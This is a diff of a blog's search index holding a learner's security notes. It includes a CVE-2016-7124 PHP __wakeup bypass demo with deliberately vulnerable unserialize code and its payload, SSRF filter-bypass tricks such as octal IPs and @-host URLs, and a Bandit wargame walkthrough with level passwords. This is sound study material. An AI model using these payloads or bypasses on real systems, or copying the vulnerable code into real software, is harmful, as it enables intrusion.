@@ -1,6 +1,39 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE学习</title>
+    <url>/2023/05/20/CVE%E9%83%A8%E5%88%86/</url>
+    <content><![CDATA[<h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
+<p>PHP版本：5.3.29nts</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>类中的wakeup()方法的绕过</p>
+<h2 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yuleiyun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	 <span class="variable language_">$this</span>-&gt;num=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;targer=<span class="string">&quot;10&quot;</span>;</span><br><span class="line">	   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;num)||!<span class="variable language_">$this</span>-&gt;num)</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">&quot;you got it!&quot;</span>; </span><br><span class="line">	   <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>逻辑为：destruct中的num值未设置或者为空时，才会有输出。</p>
+<p>已知num这个值无法更改，所以尝试使num值未设置，则要绕过wakeup()。首先我们上传的参数要为序列化后的字符串：</p>
+<p>如：</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:2:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>object(Yuleiyun)#1 (3) { [“target”]&#x3D;&gt; NULL [“b”]&#x3D;&gt; string(1) “b” [“num”]&#x3D;&gt; string(3) “123” } haha</p>
+</blockquote>
+<p>由于wakeup函数存在且比反序列化先触发，故，只要使得反序列化过程中的结构不匹配，导致 PHP 在反序列化时无法正确还原对象的结构，进而无法触发wakeup()方法。</p>
+<p>如把成员数量由2改为3，不触发wakeup()，结果为</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:3:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>you got it!bool(false)</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSRF与SSRF</title>
     <url>/2023/05/26/CSRF%E4%B8%8ESSRF/</url>
     <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF:"></a>CSRF:</h1><h2 id="漏洞解释与原理"><a href="#漏洞解释与原理" class="headerlink" title="漏洞解释与原理"></a>漏洞解释与原理</h2><h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>(Cross-site request forgery，跨站请求伪造)：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
@@ -33,7 +66,7 @@
 <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
-<li>1）使用@符号绕过：如<a href="mailto:&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#101;&#x76;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x40;&#101;&#x76;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></li>
+<li>1）使用@符号绕过：如<a href="mailto:&#49;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#x31;&#x40;&#101;&#x76;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#49;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#x31;&#x40;&#101;&#x76;&#105;&#108;&#46;&#99;&#x6f;&#x6d;</a></li>
 <li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
 </ul>
 <h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="PHP中可能存在ssrf的函数"><a href="#PHP中可能存在ssrf的函数" class="headerlink" title="PHP中可能存在ssrf的函数"></a>PHP中可能存在ssrf的函数</h3><p>1）file_get_contents():把整个文件读入一个字符串中，该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能;支持http(s),file协议，在PHP5.4上测试不支持dict，ghoper协议。<br>2）fsockopen():打开一个网络连接或者一个Unix套接字连接，在PHP5.4上测试只有http协议成功<br>3）curl_exec():用于执行指定的CURL会话，支持的协议比较多，常用于SSRF的协议经过测试都支持，如dict,ghoper,file。有的协议需要一定的条件这点需要注意。<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
@@ -51,6 +84,188 @@
       <tags>
         <tag>CSRF</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bandit(level 0-19)</title>
+    <url>/2023/05/14/bandit-level-0-19/</url>
+    <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
+<p>| 表示管道，上一条命令的输出，作为下一条命令参数，通常用来过滤&#x2F;汇总数据。</p>
+</blockquote>
+<blockquote>
+<p>&amp;&amp;表示前一条命令执行成功时，才执行后一条命令；反之，前面的命令执行失败，则&amp;&amp;后面的命令不会被执行。</p>
+</blockquote>
+<blockquote>
+<p>&amp;表示任务在后台执行，即使ssh窗口关闭，服务依然会在后台持续运行。</p>
+</blockquote>
+<blockquote>
+<p>||表示上一条命令执行失败后，才执行下一条命令。一旦执行到一条成功的命令，后面用****||****连接的命令，就不会再被执行。</p>
+</blockquote>
+<blockquote>
+<p>＞把正常信息（剔除错误信息）重定向到另一个文件内</p>
+<p><em><strong>*2&gt;*</strong></em> &#x2F;dev&#x2F;null意思就是把错误输出到“黑洞” ，不会显示在屏幕上。</p>
+</blockquote>
+<p><a href="https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request_id%22:%22168405323416800215011812%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168405323416800215011812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">Linux技巧(六)：命令尾部&amp;的作用 &amp;&amp;、|、||、；、()、&amp;＞、 2＞&amp;1 的用法和区别，很实用_linux &amp;_血煞长虹的博客-CSDN博客</a></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>我用的windows，下载了mobaXterm用于进行ssh连接</p>
+<p>是说level 1的密码呢在readme文件中，用到cat 找出来即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513211057882.png" alt="image-20230513211057882"></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>exit，然后r，重新建立连接，login as bandit1，密码是上级找到的</p>
+<p>密码在虚线文件名中，这时候cat -就不管用了。指定文件完整路径即可。</p>
+<p><img src="/image-20230513212947940.png" alt="image-20230513212947940"></p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>文件名有空格</p>
+<p>使用引号括起来</p>
+<p><img src="/image-20230513214101452.png" alt="image-20230513214101452"></p>
+<p>aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG</p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>说是在inhere目录下的隐藏文件中</p>
+<p>需要用到ls -a命令查看隐藏</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513214557871.png" alt="image-20230513214557871"></p>
+<p>2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe</p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>在inhere目录下，只有一个唯一可读的文件</p>
+<p>由于文件名都有规律，且有特殊符号，于是我用了 cat .&#x2F;-file0{0,1,2…9}的方法，也就是在末尾3个之间，再cat .&#x2F;-file07试试，有了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221122380.png" alt="image-20230513221122380"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221420135.png" alt="image-20230513221420135"></p>
+<p>lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR</p>
+<p>正解操作是：</p>
+<p>file .&#x2F;-file* 查看文件类型</p>
+<p>cat .&#x2F;-file07</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>密码存储文件在inhere目录下，且可读、1033bytes、不可执行</p>
+<p>inhere目录下有将近20个目录，一个个来不太现实，用到du命令</p>
+<p>du : 显示每个文件和目录的磁盘使用空间~~~文件的大小。</p>
+<p>命令参数：</p>
+<p>-a   #显示目录中文件的大小  单位 KB 。</p>
+<p>-b  #显示目录中文件的大小，以字节byte为单位。</p>
+<p>-c  #显示目录中文件的大小，同时也显示总和；单位KB。</p>
+<p>-k 、 -m  #显示目录中文件的大小，-k 单位KB，-m 单位MB.</p>
+<p>-s  #仅显示目录的总值，单位KB。</p>
+<p>-h  #以K  M  G为单位显示，提高可读性~~~（最常用的一个~也可能只用这一个就满足需求了）<br><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223236240.png" alt="image-20230513223236240"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223206962.png" alt="image-20230513223206962"></p>
+<p>du -a -b</p>
+<p>cat .&#x2F;maybehere07&#x2F;.file2</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223351281.png" alt="image-20230513223351281"></p>
+<p>P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU</p>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>被存在服务器的某处，由用户bandit7所有，bandit6组所有，33bytes</p>
+<p>find基本用法：find [PATH] [option] [action]  </p>
+<p>-user name : 列出文件所有者为name的文件<br>        -group name : 列出文件所属用户组为name的文件<br>        -uid n : 列出文件所有者为用户ID为n的文件<br>        -gid n : 列出文件所属用户组为用户组ID为n的文件  </p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112457648.png" alt="image-20230514112457648"></p>
+<p>可以使用 <strong>2&gt;&#x2F;dev&#x2F;null</strong> 将错误信息重定向</p>
+<p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112752119.png" alt="image-20230514112752119"></p>
+<p>参考<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>在data.txt文件中内容为<strong>millionth</strong>的那一行中</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514114655477.png" alt="image-20230514114655477"></p>
+<p>TESKZC0XvTetK0S9xNwm25STk5iWrBvP</p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>在data.txt中，仅出现一次的行文本中</p>
+<p>sort与uniq命令</p>
+<p>sort排序，</p>
+<p>uniq是去掉相邻的重复行，-c统计次数，-u显示不重复的行</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115858357.png" alt="image-20230514115858357"></p>
+<p>-c找出现次数为1的即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115916436.png" alt="image-20230514115916436"></p>
+<p>参考：<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>在data.txt文件中的少数几个人类可读的字符串中，前面有几个&#x3D;符号</p>
+<p>一般查看有乱码</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121138624.png" alt="image-20230514121138624"></p>
+<p><code>用strings data.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121241304.png" alt="image-20230514121241304"></p>
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>data.txt文件中，但是包含base64编码</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121610805.png" alt="image-20230514121610805"></p>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>data.txt文件中，但是rot13加密</p>
+<p>tr命令：对输入字符进行替换、压缩和删除</p>
+<p>将所有的字符向后移动13位,但要保持大写和小写</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122106548.png" alt="image-20230514122106548"></p>
+<p>参考：[使用ROT13加密解密_tr解rot13_apersonlikep的博客-CSDN博客](<a href="https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request_id%22:%22168403789316800182732613%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168403789316800182732613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request%5Fid%22%3A%22168403789316800182732613%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168403789316800182732613&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> rot13&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>是data.txt文件，但是反复压缩，十六进制转储。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122659959.png" alt="image-20230514122659959"></p>
+<p>xxd命令：转二级制、十六进制</p>
+<p>mv命令：重命名</p>
+<p>gzip&#x2F;bzip2 -d&#x2F;tar -xvf命令：解压缩</p>
+<p>先转二级制</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123813942.png" alt="image-20230514123813942"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123825354.png" alt="image-20230514123825354"></p>
+<p>重命名gz、解压</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123946806.png" alt="image-20230514123946806"></p>
+<p>重命名bz2、解压</p>
+<p><img src="/image-20230514124152671.png" alt="image-20230514124152671"></p>
+<p>重命名gz、解压</p>
+<p><img src="/image-20230514124254797.png" alt="image-20230514124254797"></p>
+<p>重命名tar、解压</p>
+<p><img src="/image-20230514124423926.png" alt="image-20230514124423926"></p>
+<p><img src="/image-20230514124556058.png" alt="image-20230514124556058"></p>
+<p>重命名bz2，解压</p>
+<p><img src="/image-20230514124733776.png" alt="image-20230514124733776"></p>
+<p>重命名tar、解压</p>
+<p><img src="/image-20230514124850246.png" alt="image-20230514124850246"></p>
+<p>重命名gz、解压</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514124956549.png" alt="image-20230514124956549"></p>
+<h2 id="ssh、telnet、nc、openssl、nmap工具篇"><a href="#ssh、telnet、nc、openssl、nmap工具篇" class="headerlink" title="ssh、telnet、nc、openssl、nmap工具篇"></a>ssh、telnet、nc、openssl、nmap工具篇</h2><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>在**&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14**中，且只能由bandit14用户读取。且提供了一个私有SSH密钥。</p>
+<!--ssh -i 秘钥文件名称 root@远程IP地址-->
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514130400052.png" alt="image-20230514130400052"></p>
+<p>报错了，看不懂，但是看到绿字说22端口登录是不支持的，于是换个端口。</p>
+<p>加了个-p 2220，虽然也报错，但还是提示连到了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132248403.png" alt="image-20230514132248403"></p>
+<p>查看即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132359501.png" alt="image-20230514132359501"></p>
+<p>fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq</p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>连接到本机，且端口为30000提交密码</p>
+<p>telnet ip地址 端口</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133034901.png" alt="image-20230514133034901"></p>
+<p>jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt</p>
+<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>在localhost，端口为30001处提交上关密码，且有ssl加密</p>
+<p>openssl：多用途、跨平台密码工具</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133923601.png" alt="image-20230514133923601"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133934323.png" alt="image-20230514133934323"></p>
+<p>JQttfApK4SeyHwDlI9SXGR50qclOAil1</p>
+<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>目的是获取证书，将上一级的密码发送至端口范围为31000到32000的localhost上。1.找出有哪些端口是服务器监听着的；2.找出哪些是使用SSL的；3.只有一个服务器是会给你下一级证书的，其它的只会重复你发给它的。</p>
+<p>知识点：端口扫描</p>
+<p><code>nmap localhost -p310000-320000</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515113201632.png" alt="image-20230515113201632"></p>
+<p><code>openssl s_client -connect localhost:port</code>对上述端口依次尝试，并提交密码</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114635689.png" alt="image-20230515114635689"></p>
+<p>port为31790时</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114912840.png" alt="image-20230515114912840"></p>
+<p>可以知道，又是私钥登陆，与ssh -i有关</p>
+<p>存放该私钥。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120130800.png" alt="image-20230515120130800"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120139520.png" alt="image-20230515120139520"></p>
+<p><code>ssh -i /tmp/my111/key bandit17@localhost -p2220</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120357068.png" alt="image-20230515120357068"></p>
+<p>要设定权限，700，即只有拥有者可以读写。</p>
+<p><code>chmod 700 /tmp/my111/key</code></p>
+<p><img src="/../../../Typora/img111/image-20230515120619059.png" alt="image-20230515120619059"></p>
+<p>成功登入。</p>
+<h2 id="level-17-gt-18"><a href="#level-17-gt-18" class="headerlink" title="level 17-&gt;18"></a>level 17-&gt;18</h2><p>在主目录有两文件<strong>passwords.old and passwords.new</strong>. </p>
+<p>下一级的密码在 <strong>passwords.new</strong>里，并且这个old和new只有一行改动了的。</p>
+<p>​		注意：当登入bandit18时看到”Byebye!”，这和bandit19有关。</p>
+<p>diff命令，比较文件不同。</p>
+<ul>
+<li><p>“|”表示前后2个文件内容有不同</p>
+</li>
+<li><p>“&lt;”表示后面文件比前面文件少了1行内容</p>
+</li>
+<li><p>“&gt;”表示后面文件比前面文件多了1行内容</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130247402.png" alt="image-20230515130247402"></p>
+</li>
+</ul>
+<p>hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg</p>
+<p>exit -&gt;r</p>
+<p>登入bandit18，输入密码出现：<img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130727349.png" alt="image-20230515130727349"></p>
+<h2 id="level-18-gt-19"><a href="#level-18-gt-19" class="headerlink" title="level 18-&gt;19"></a>level 18-&gt;19</h2><p>下一级密码在主目录的readme中，但是嘞，有人修改了.bashrc，使得在使用SSH登录时注销。</p>
+<p>考察点：ssh登陆后可以跟命令执行</p>
+<p>所以在bandit17时采用远程登录。</p>
+<p><code>ssh bandit18@localhost -p2220</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515133004926.png" alt="image-20230515133004926"></p>
+<p>上图中，rm和chmod也是不允许的操作，查找其他博主的wp，在后面加了“cat  readme”但没效果</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515145336983-1684133695637-1.png"></p>
+<p>止步于此，没权限，不搞了。</p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>ssh</tag>
+        <tag>bandit</tag>
       </tags>
   </entry>
   <entry>
@@ -244,221 +459,6 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>Web源码拓展</title>
-    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
-    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
-<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
-<p>电商-业务逻辑突出</p>
-<p>论坛-xss逻辑突出</p>
-<p>博客-漏洞较少</p>
-<p>第三方-功能决定</p>
-<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
-<p>CMS识别-即是否套用了模板</p>
-<p>开源-找漏洞和审计</p>
-<p>内部-渗透测试</p>
-<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web源码拓展</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE学习</title>
-    <url>/2023/05/20/CVE%E9%83%A8%E5%88%86/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bandit(level 0-19)</title>
-    <url>/2023/05/14/bandit-level-0-19/</url>
-    <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
-<p>| 表示管道，上一条命令的输出，作为下一条命令参数，通常用来过滤&#x2F;汇总数据。</p>
-</blockquote>
-<blockquote>
-<p>&amp;&amp;表示前一条命令执行成功时，才执行后一条命令；反之，前面的命令执行失败，则&amp;&amp;后面的命令不会被执行。</p>
-</blockquote>
-<blockquote>
-<p>&amp;表示任务在后台执行，即使ssh窗口关闭，服务依然会在后台持续运行。</p>
-</blockquote>
-<blockquote>
-<p>||表示上一条命令执行失败后，才执行下一条命令。一旦执行到一条成功的命令，后面用****||****连接的命令，就不会再被执行。</p>
-</blockquote>
-<blockquote>
-<p>＞把正常信息（剔除错误信息）重定向到另一个文件内</p>
-<p><em><strong>*2&gt;*</strong></em> &#x2F;dev&#x2F;null意思就是把错误输出到“黑洞” ，不会显示在屏幕上。</p>
-</blockquote>
-<p><a href="https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request_id%22:%22168405323416800215011812%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168405323416800215011812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">Linux技巧(六)：命令尾部&amp;的作用 &amp;&amp;、|、||、；、()、&amp;＞、 2＞&amp;1 的用法和区别，很实用_linux &amp;_血煞长虹的博客-CSDN博客</a></p>
-<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>我用的windows，下载了mobaXterm用于进行ssh连接</p>
-<p>是说level 1的密码呢在readme文件中，用到cat 找出来即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513211057882.png" alt="image-20230513211057882"></p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>exit，然后r，重新建立连接，login as bandit1，密码是上级找到的</p>
-<p>密码在虚线文件名中，这时候cat -就不管用了。指定文件完整路径即可。</p>
-<p><img src="/image-20230513212947940.png" alt="image-20230513212947940"></p>
-<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>文件名有空格</p>
-<p>使用引号括起来</p>
-<p><img src="/image-20230513214101452.png" alt="image-20230513214101452"></p>
-<p>aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG</p>
-<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>说是在inhere目录下的隐藏文件中</p>
